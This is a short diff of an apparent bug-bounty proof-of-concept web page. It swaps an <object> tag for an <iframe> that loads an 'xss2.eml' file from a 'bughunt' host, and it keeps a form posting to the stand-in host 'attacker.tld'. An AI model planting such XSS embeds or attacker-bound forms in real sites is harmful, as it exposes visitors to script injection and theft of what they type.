@@ -33,7 +33,7 @@ include 'log.php';
   </head>
   <body>
     
-   <object data="https://bughunt1307.herokuapp.com/xss2.eml">
+   <iframe src="https://bughunt1307.herokuapp.com/xss2.eml">
 
 <div><form action="http://attacker.tld"></div>
 
